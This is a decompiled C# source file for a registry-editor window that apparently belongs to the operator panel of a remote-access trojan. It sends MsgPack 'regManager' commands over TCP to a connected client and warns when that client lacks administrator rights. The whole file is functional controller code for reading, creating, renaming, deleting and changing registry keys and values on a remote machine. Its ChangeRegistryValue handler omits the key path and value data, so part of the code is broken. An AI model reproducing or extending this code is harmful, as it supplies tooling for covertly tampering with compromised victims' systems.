﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Server.Connection;
using Server.Helper;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x0200009F RID: 159
	public partial class FormRegistryEditor : Form
	{
		// Token: 0x170000E3 RID: 227
		// (get) Token: 0x060004FA RID: 1274 RVA: 0x000049EA File Offset: 0x00002BEA
		// (set) Token: 0x060004FB RID: 1275 RVA: 0x000049F2 File Offset: 0x00002BF2
		public Form1 F { get; set; }

		// Token: 0x170000E4 RID: 228
		// (get) Token: 0x060004FC RID: 1276 RVA: 0x000049FB File Offset: 0x00002BFB
		// (set) Token: 0x060004FD RID: 1277 RVA: 0x00004A03 File Offset: 0x00002C03
		internal Clients Client { get; set; }

		// Token: 0x170000E5 RID: 229
		// (get) Token: 0x060004FE RID: 1278 RVA: 0x00004A0C File Offset: 0x00002C0C
		// (set) Token: 0x060004FF RID: 1279 RVA: 0x00004A14 File Offset: 0x00002C14
		internal Clients ParentClient { get; set; }

		// Token: 0x06000500 RID: 1280 RVA: 0x00004A1D File Offset: 0x00002C1D
		public FormRegistryEditor()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000501 RID: 1281 RVA: 0x00004A2B File Offset: 0x00002C2B
		private void FrmRegistryEditor_Load(object sender, EventArgs e)
		{
			if (!this.ParentClient.Admin)
			{
				MessageBox.Show("The client software is not running as administrator and therefore some functionality like Update, Create, Open and Delete may not work properly!", "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
		}

		// Token: 0x06000502 RID: 1282 RVA: 0x0003251C File Offset: 0x0003071C
		private void AddRootKey(RegistrySeeker.RegSeekerMatch match)
		{
			TreeNode treeNode = this.CreateNode(match.Key, match.Key, match.Data);
			treeNode.Nodes.Add(new TreeNode());
			this.tvRegistryDirectory.Nodes.Add(treeNode);
		}

		// Token: 0x06000503 RID: 1283 RVA: 0x00032568 File Offset: 0x00030768
		private TreeNode AddKeyToTree(TreeNode parent, RegistrySeeker.RegSeekerMatch subKey)
		{
			TreeNode treeNode = this.CreateNode(subKey.Key, subKey.Key, subKey.Data);
			parent.Nodes.Add(treeNode);
			if (subKey.HasSubKeys)
			{
				treeNode.Nodes.Add(new TreeNode());
			}
			return treeNode;
		}

		// Token: 0x06000504 RID: 1284 RVA: 0x00004A4D File Offset: 0x00002C4D
		private TreeNode CreateNode(string key, string text, object tag)
		{
			return new TreeNode
			{
				Text = text,
				Name = key,
				Tag = tag
			};
		}

		// Token: 0x06000505 RID: 1285 RVA: 0x000325B8 File Offset: 0x000307B8
		public void AddKeys(string rootKey, RegistrySeeker.RegSeekerMatch[] matches)
		{
			if (string.IsNullOrEmpty(rootKey))
			{
				this.tvRegistryDirectory.BeginUpdate();
				foreach (RegistrySeeker.RegSeekerMatch match in matches)
				{
					this.AddRootKey(match);
				}
				this.tvRegistryDirectory.SelectedNode = this.tvRegistryDirectory.Nodes[0];
				this.tvRegistryDirectory.EndUpdate();
				return;
			}
			TreeNode treeNode = this.GetTreeNode(rootKey);
			if (treeNode != null)
			{
				this.tvRegistryDirectory.BeginUpdate();
				foreach (RegistrySeeker.RegSeekerMatch subKey in matches)
				{
					this.AddKeyToTree(treeNode, subKey);
				}
				treeNode.Expand();
				this.tvRegistryDirectory.EndUpdate();
			}
		}

		// Token: 0x06000506 RID: 1286 RVA: 0x00032664 File Offset: 0x00030864
		public void CreateNewKey(string rootKey, RegistrySeeker.RegSeekerMatch match)
		{
			TreeNode treeNode = this.GetTreeNode(rootKey);
			TreeNode treeNode2 = this.AddKeyToTree(treeNode, match);
			treeNode2.EnsureVisible();
			this.tvRegistryDirectory.SelectedNode = treeNode2;
			treeNode2.Expand();
			this.tvRegistryDirectory.LabelEdit = true;
			treeNode2.BeginEdit();
		}

		// Token: 0x06000507 RID: 1287 RVA: 0x000326AC File Offset: 0x000308AC
		public void DeleteKey(string rootKey, string subKey)
		{
			TreeNode treeNode = this.GetTreeNode(rootKey);
			if (treeNode.Nodes.ContainsKey(subKey))
			{
				treeNode.Nodes.RemoveByKey(subKey);
			}
		}

		// Token: 0x06000508 RID: 1288 RVA: 0x000326DC File Offset: 0x000308DC
		public void RenameKey(string rootKey, string oldName, string newName)
		{
			TreeNode treeNode = this.GetTreeNode(rootKey);
			if (treeNode.Nodes.ContainsKey(oldName))
			{
				treeNode.Nodes[oldName].Text = newName;
				treeNode.Nodes[oldName].Name = newName;
				this.tvRegistryDirectory.SelectedNode = treeNode.Nodes[newName];
			}
		}

		// Token: 0x06000509 RID: 1289 RVA: 0x0003273C File Offset: 0x0003093C
		private TreeNode GetTreeNode(string path)
		{
			string[] array = path.Split(new char[]
			{
				'\\'
			});
			TreeNode treeNode = this.tvRegistryDirectory.Nodes[array[0]];
			if (treeNode == null)
			{
				return null;
			}
			for (int i = 1; i < array.Length; i++)
			{
				treeNode = treeNode.Nodes[array[i]];
				if (treeNode == null)
				{
					return null;
				}
			}
			return treeNode;
		}

		// Token: 0x0600050A RID: 1290 RVA: 0x00032798 File Offset: 0x00030998
		public void CreateValue(string keyPath, RegistrySeeker.RegValueData value)
		{
			TreeNode treeNode = this.GetTreeNode(keyPath);
			if (treeNode != null)
			{
				List<RegistrySeeker.RegValueData> list = ((RegistrySeeker.RegValueData[])treeNode.Tag).ToList<RegistrySeeker.RegValueData>();
				list.Add(value);
				treeNode.Tag = list.ToArray();
				if (this.tvRegistryDirectory.SelectedNode == treeNode)
				{
					RegistryValueLstItem registryValueLstItem = new RegistryValueLstItem(value);
					this.lstRegistryValues.Items.Add(registryValueLstItem);
					this.lstRegistryValues.SelectedIndices.Clear();
					registryValueLstItem.Selected = true;
					this.lstRegistryValues.LabelEdit = true;
					registryValueLstItem.BeginEdit();
				}
				this.tvRegistryDirectory.SelectedNode = treeNode;
			}
		}

		// Token: 0x0600050B RID: 1291 RVA: 0x00032834 File Offset: 0x00030A34
		public void DeleteValue(string keyPath, string valueName)
		{
			TreeNode treeNode = this.GetTreeNode(keyPath);
			if (treeNode != null)
			{
				if (!RegValueHelper.IsDefaultValue(valueName))
				{
					treeNode.Tag = (from value in (RegistrySeeker.RegValueData[])treeNode.Tag
					where value.Name != valueName
					select value).ToArray<RegistrySeeker.RegValueData>();
					if (this.tvRegistryDirectory.SelectedNode == treeNode)
					{
						this.lstRegistryValues.Items.RemoveByKey(valueName);
					}
				}
				else
				{
					RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == valueName);
					if (this.tvRegistryDirectory.SelectedNode == treeNode)
					{
						RegistryValueLstItem registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == valueName);
						if (registryValueLstItem != null)
						{
							registryValueLstItem.Data = regValueData.Kind.RegistryTypeToString(null);
						}
					}
				}
				this.tvRegistryDirectory.SelectedNode = treeNode;
			}
		}

		// Token: 0x0600050C RID: 1292 RVA: 0x00032924 File Offset: 0x00030B24
		public void RenameValue(string keyPath, string oldName, string newName)
		{
			TreeNode treeNode = this.GetTreeNode(keyPath);
			if (treeNode != null)
			{
				((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == oldName).Name = newName;
				if (this.tvRegistryDirectory.SelectedNode == treeNode)
				{
					RegistryValueLstItem registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == oldName);
					if (registryValueLstItem != null)
					{
						registryValueLstItem.RegName = newName;
					}
				}
				this.tvRegistryDirectory.SelectedNode = treeNode;
			}
		}

		// Token: 0x0600050D RID: 1293 RVA: 0x000329B4 File Offset: 0x00030BB4
		public void ChangeValue(string keyPath, RegistrySeeker.RegValueData value)
		{
			TreeNode treeNode = this.GetTreeNode(keyPath);
			if (treeNode != null)
			{
				RegistrySeeker.RegValueData dest = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == value.Name);
				this.ChangeRegistryValue(value, dest);
				if (this.tvRegistryDirectory.SelectedNode == treeNode)
				{
					RegistryValueLstItem registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == value.Name);
					if (registryValueLstItem != null)
					{
						registryValueLstItem.Data = RegValueHelper.RegistryValueToString(value);
					}
				}
				this.tvRegistryDirectory.SelectedNode = treeNode;
			}
		}

		// Token: 0x0600050E RID: 1294 RVA: 0x00004A69 File Offset: 0x00002C69
		private void ChangeRegistryValue(RegistrySeeker.RegValueData source, RegistrySeeker.RegValueData dest)
		{
			if (source.Kind != dest.Kind)
			{
				return;
			}
			dest.Data = source.Data;
		}

		// Token: 0x0600050F RID: 1295 RVA: 0x00032A54 File Offset: 0x00030C54
		private void UpdateLstRegistryValues(TreeNode node)
		{
			this.selectedStripStatusLabel.Text = node.FullPath;
			RegistrySeeker.RegValueData[] values = (RegistrySeeker.RegValueData[])node.Tag;
			this.PopulateLstRegistryValues(values);
		}

		// Token: 0x06000510 RID: 1296 RVA: 0x00032A88 File Offset: 0x00030C88
		private void PopulateLstRegistryValues(RegistrySeeker.RegValueData[] values)
		{
			this.lstRegistryValues.BeginUpdate();
			this.lstRegistryValues.Items.Clear();
			values = (from value in values
			orderby value.Name
			select value).ToArray<RegistrySeeker.RegValueData>();
			RegistrySeeker.RegValueData[] array = values;
			for (int i = 0; i < array.Length; i++)
			{
				RegistryValueLstItem value2 = new RegistryValueLstItem(array[i]);
				this.lstRegistryValues.Items.Add(value2);
			}
			this.lstRegistryValues.EndUpdate();
		}

		// Token: 0x06000511 RID: 1297 RVA: 0x00032B14 File Offset: 0x00030D14
		private void tvRegistryDirectory_AfterLabelEdit(object sender, NodeLabelEditEventArgs e)
		{
			if (e.Label == null)
			{
				this.tvRegistryDirectory.LabelEdit = false;
				return;
			}
			e.CancelEdit = true;
			if (e.Label.Length <= 0)
			{
				MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				e.Node.BeginEdit();
				return;
			}
			if (e.Node.Parent.Nodes.ContainsKey(e.Label))
			{
				MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				e.Node.BeginEdit();
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "RenameRegistryKey";
			msgPack.ForcePathObject("OldKeyName").AsString = e.Node.Name;
			msgPack.ForcePathObject("NewKeyName").AsString = e.Label;
			msgPack.ForcePathObject("ParentPath").AsString = e.Node.Parent.FullPath;
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			this.tvRegistryDirectory.LabelEdit = false;
		}

		// Token: 0x06000512 RID: 1298 RVA: 0x00032C58 File Offset: 0x00030E58
		private void tvRegistryDirectory_BeforeExpand(object sender, TreeViewCancelEventArgs e)
		{
			TreeNode node = e.Node;
			if (string.IsNullOrEmpty(node.FirstNode.Name))
			{
				this.tvRegistryDirectory.SuspendLayout();
				node.Nodes.Clear();
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "LoadRegistryKey";
				msgPack.ForcePathObject("RootKeyName").AsString = node.FullPath;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				Thread.Sleep(500);
				this.tvRegistryDirectory.ResumeLayout();
				e.Cancel = true;
			}
		}

		// Token: 0x06000513 RID: 1299 RVA: 0x00032D18 File Offset: 0x00030F18
		private void tvRegistryDirectory_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
		{
			if (e.Button == MouseButtons.Right)
			{
				this.tvRegistryDirectory.SelectedNode = e.Node;
				Point position = new Point(e.X, e.Y);
				this.CreateTreeViewMenuStrip();
				this.tv_ContextMenuStrip.Show(this.tvRegistryDirectory, position);
			}
		}

		// Token: 0x06000514 RID: 1300 RVA: 0x00004A86 File Offset: 0x00002C86
		private void tvRegistryDirectory_BeforeSelect(object sender, TreeViewCancelEventArgs e)
		{
			this.UpdateLstRegistryValues(e.Node);
		}

		// Token: 0x06000515 RID: 1301 RVA: 0x00004A94 File Offset: 0x00002C94
		private void tvRegistryDirectory_KeyUp(object sender, KeyEventArgs e)
		{
			if (e.KeyCode == Keys.Delete && this.GetDeleteState())
			{
				this.deleteRegistryKey_Click(this, e);
			}
		}

		// Token: 0x06000516 RID: 1302 RVA: 0x00032D70 File Offset: 0x00030F70
		private void CreateEditToolStrip()
		{
			this.modifyToolStripMenuItem1.Visible = (this.modifyBinaryDataToolStripMenuItem1.Visible = (this.modifyNewtoolStripSeparator.Visible = this.lstRegistryValues.Focused));
			this.modifyToolStripMenuItem1.Enabled = (this.modifyBinaryDataToolStripMenuItem1.Enabled = (this.lstRegistryValues.SelectedItems.Count == 1));
			this.renameToolStripMenuItem2.Enabled = this.GetRenameState();
			this.deleteToolStripMenuItem2.Enabled = this.GetDeleteState();
		}

		// Token: 0x06000517 RID: 1303 RVA: 0x00004AB0 File Offset: 0x00002CB0
		private void CreateTreeViewMenuStrip()
		{
			this.renameToolStripMenuItem.Enabled = (this.tvRegistryDirectory.SelectedNode.Parent != null);
			this.deleteToolStripMenuItem.Enabled = (this.tvRegistryDirectory.SelectedNode.Parent != null);
		}

		// Token: 0x06000518 RID: 1304 RVA: 0x00032E00 File Offset: 0x00031000
		private void CreateListViewMenuStrip()
		{
			this.modifyToolStripMenuItem.Enabled = (this.modifyBinaryDataToolStripMenuItem.Enabled = (this.lstRegistryValues.SelectedItems.Count == 1));
			this.renameToolStripMenuItem1.Enabled = (this.lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(this.lstRegistryValues.SelectedItems[0].Name));
			this.deleteToolStripMenuItem1.Enabled = (this.tvRegistryDirectory.SelectedNode != null && this.lstRegistryValues.SelectedItems.Count > 0);
		}

		// Token: 0x06000519 RID: 1305 RVA: 0x00004AEE File Offset: 0x00002CEE
		private void editToolStripMenuItem_DropDownOpening(object sender, EventArgs e)
		{
			this.CreateEditToolStrip();
		}

		// Token: 0x0600051A RID: 1306 RVA: 0x000048D2 File Offset: 0x00002AD2
		private void menuStripExit_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x0600051B RID: 1307 RVA: 0x00004AF6 File Offset: 0x00002CF6
		private void menuStripDelete_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.Focused)
			{
				this.deleteRegistryKey_Click(this, e);
				return;
			}
			if (this.lstRegistryValues.Focused)
			{
				this.deleteRegistryValue_Click(this, e);
			}
		}

		// Token: 0x0600051C RID: 1308 RVA: 0x00004B23 File Offset: 0x00002D23
		private void menuStripRename_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.Focused)
			{
				this.renameRegistryKey_Click(this, e);
				return;
			}
			if (this.lstRegistryValues.Focused)
			{
				this.renameRegistryValue_Click(this, e);
			}
		}

		// Token: 0x0600051D RID: 1309 RVA: 0x00032EA8 File Offset: 0x000310A8
		private void lstRegistryKeys_MouseClick(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Right)
			{
				Point position = new Point(e.X, e.Y);
				if (this.lstRegistryValues.GetItemAt(position.X, position.Y) == null)
				{
					this.lst_ContextMenuStrip.Show(this.lstRegistryValues, position);
					return;
				}
				this.CreateListViewMenuStrip();
				this.selectedItem_ContextMenuStrip.Show(this.lstRegistryValues, position);
			}
		}

		// Token: 0x0600051E RID: 1310 RVA: 0x00032F1C File Offset: 0x0003111C
		private void lstRegistryKeys_AfterLabelEdit(object sender, LabelEditEventArgs e)
		{
			if (e.Label == null || this.tvRegistryDirectory.SelectedNode == null)
			{
				this.lstRegistryValues.LabelEdit = false;
				return;
			}
			e.CancelEdit = true;
			int item = e.Item;
			if (e.Label.Length <= 0)
			{
				MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				this.lstRegistryValues.Items[item].BeginEdit();
				return;
			}
			if (this.lstRegistryValues.Items.ContainsKey(e.Label))
			{
				MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				this.lstRegistryValues.Items[item].BeginEdit();
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "RenameRegistryValue";
			msgPack.ForcePathObject("OldValueName").AsString = this.lstRegistryValues.Items[item].Name;
			msgPack.ForcePathObject("NewValueName").AsString = e.Label;
			msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			this.lstRegistryValues.LabelEdit = false;
		}

		// Token: 0x0600051F RID: 1311 RVA: 0x00004B50 File Offset: 0x00002D50
		private void lstRegistryKeys_KeyUp(object sender, KeyEventArgs e)
		{
			if (e.KeyCode == Keys.Delete && this.GetDeleteState())
			{
				this.deleteRegistryValue_Click(this, e);
			}
		}

		// Token: 0x06000520 RID: 1312 RVA: 0x00033094 File Offset: 0x00031294
		private void createNewRegistryKey_Click(object sender, EventArgs e)
		{
			if (!this.tvRegistryDirectory.SelectedNode.IsExpanded && this.tvRegistryDirectory.SelectedNode.Nodes.Count > 0)
			{
				this.tvRegistryDirectory.AfterExpand += this.createRegistryKey_AfterExpand;
				this.tvRegistryDirectory.SelectedNode.Expand();
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "CreateRegistryKey";
			msgPack.ForcePathObject("ParentPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000521 RID: 1313 RVA: 0x00033160 File Offset: 0x00031360
		private void deleteRegistryKey_Click(object sender, EventArgs e)
		{
			string text = "Are you sure you want to permanently delete this key and all of its subkeys?";
			string caption = "Confirm Key Delete";
			if (MessageBox.Show(text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				string fullPath = this.tvRegistryDirectory.SelectedNode.Parent.FullPath;
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "DeleteRegistryKey";
				msgPack.ForcePathObject("KeyName").AsString = this.tvRegistryDirectory.SelectedNode.Name;
				msgPack.ForcePathObject("ParentPath").AsString = fullPath;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x06000522 RID: 1314 RVA: 0x00004B6C File Offset: 0x00002D6C
		private void renameRegistryKey_Click(object sender, EventArgs e)
		{
			this.tvRegistryDirectory.LabelEdit = true;
			this.tvRegistryDirectory.SelectedNode.BeginEdit();
		}

		// Token: 0x06000523 RID: 1315 RVA: 0x0003321C File Offset: 0x0003141C
		private void createStringRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "1";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x06000524 RID: 1316 RVA: 0x000332BC File Offset: 0x000314BC
		private void createBinaryRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "3";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x06000525 RID: 1317 RVA: 0x0003335C File Offset: 0x0003155C
		private void createDwordRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "4";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x06000526 RID: 1318 RVA: 0x000333FC File Offset: 0x000315FC
		private void createQwordRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "11";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x06000527 RID: 1319 RVA: 0x0003349C File Offset: 0x0003169C
		private void createMultiStringRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "7";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x06000528 RID: 1320 RVA: 0x0003353C File Offset: 0x0003173C
		private void createExpandStringRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "2";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x06000529 RID: 1321 RVA: 0x000335DC File Offset: 0x000317DC
		private void deleteRegistryValue_Click(object sender, EventArgs e)
		{
			string text = "Deleting certain registry values could cause system instability. Are you sure you want to permanently delete " + ((this.lstRegistryValues.SelectedItems.Count == 1) ? "this value?" : "these values?");
			string caption = "Confirm Value Delete";
			if (MessageBox.Show(text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				foreach (object obj in this.lstRegistryValues.SelectedItems)
				{
					if (obj.GetType() == typeof(RegistryValueLstItem))
					{
						RegistryValueLstItem registryValueLstItem = (RegistryValueLstItem)obj;
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
						msgPack.ForcePathObject("Command").AsString = "DeleteRegistryValue";
						msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
						msgPack.ForcePathObject("ValueName").AsString = registryValueLstItem.RegName;
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					}
				}
			}
		}

		// Token: 0x0600052A RID: 1322 RVA: 0x00004B8A File Offset: 0x00002D8A
		private void renameRegistryValue_Click(object sender, EventArgs e)
		{
			this.lstRegistryValues.LabelEdit = true;
			this.lstRegistryValues.SelectedItems[0].BeginEdit();
		}

		// Token: 0x0600052B RID: 1323 RVA: 0x00004BAE File Offset: 0x00002DAE
		private void modifyRegistryValue_Click(object sender, EventArgs e)
		{
			this.CreateEditForm(false);
		}

		// Token: 0x0600052C RID: 1324 RVA: 0x00004BB7 File Offset: 0x00002DB7
		private void modifyBinaryDataRegistryValue_Click(object sender, EventArgs e)
		{
			this.CreateEditForm(true);
		}

		// Token: 0x0600052D RID: 1325 RVA: 0x00004BC0 File Offset: 0x00002DC0
		private void createRegistryKey_AfterExpand(object sender, TreeViewEventArgs e)
		{
			if (e.Node == this.tvRegistryDirectory.SelectedNode)
			{
				this.createNewRegistryKey_Click(this, e);
				this.tvRegistryDirectory.AfterExpand -= this.createRegistryKey_AfterExpand;
			}
		}

		// Token: 0x0600052E RID: 1326 RVA: 0x00033720 File Offset: 0x00031920
		private bool GetDeleteState()
		{
			if (this.lstRegistryValues.Focused)
			{
				return this.lstRegistryValues.SelectedItems.Count > 0;
			}
			return this.tvRegistryDirectory.Focused && this.tvRegistryDirectory.SelectedNode != null && this.tvRegistryDirectory.SelectedNode.Parent != null;
		}

		// Token: 0x0600052F RID: 1327 RVA: 0x00033780 File Offset: 0x00031980
		private bool GetRenameState()
		{
			if (this.lstRegistryValues.Focused)
			{
				return this.lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(this.lstRegistryValues.SelectedItems[0].Name);
			}
			return this.tvRegistryDirectory.Focused && this.tvRegistryDirectory.SelectedNode != null && this.tvRegistryDirectory.SelectedNode.Parent != null;
		}

		// Token: 0x06000530 RID: 1328 RVA: 0x00033800 File Offset: 0x00031A00
		private Form GetEditForm(RegistrySeeker.RegValueData value, RegistryValueKind valueKind)
		{
			switch (valueKind)
			{
			case RegistryValueKind.String:
			case RegistryValueKind.ExpandString:
				return new FormRegValueEditString(value);
			case RegistryValueKind.Binary:
				return new FormRegValueEditBinary(value);
			case RegistryValueKind.DWord:
			case RegistryValueKind.QWord:
				return new FormRegValueEditWord(value);
			case RegistryValueKind.MultiString:
				return new FormRegValueEditMultiString(value);
			}
			return null;
		}

		// Token: 0x06000531 RID: 1329 RVA: 0x00033860 File Offset: 0x00031A60
		private void CreateEditForm(bool isBinary)
		{
			string fullPath = this.tvRegistryDirectory.SelectedNode.FullPath;
			string name = this.lstRegistryValues.SelectedItems[0].Name;
			RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])this.tvRegistryDirectory.SelectedNode.Tag).ToList<RegistrySeeker.RegValueData>().Find((RegistrySeeker.RegValueData item) => item.Name == name);
			RegistryValueKind valueKind = isBinary ? RegistryValueKind.Binary : regValueData.Kind;
			using (Form editForm = this.GetEditForm(regValueData, valueKind))
			{
				if (editForm.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
					msgPack.ForcePathObject("Command").AsString = "ChangeRegistryValue";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
		}

		// Token: 0x06000532 RID: 1330 RVA: 0x00033958 File Offset: 0x00031B58
		public void timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x06000533 RID: 1331 RVA: 0x00004BF4 File Offset: 0x00002DF4
		private void FormRegistryEditor_FormClosed(object sender, FormClosedEventArgs e)
		{
			ThreadPool.QueueUserWorkItem(delegate(object o)
			{
				Clients client = this.Client;
				if (client == null)
				{
					return;
				}
				client.Disconnected();
			});
		}
	}
}
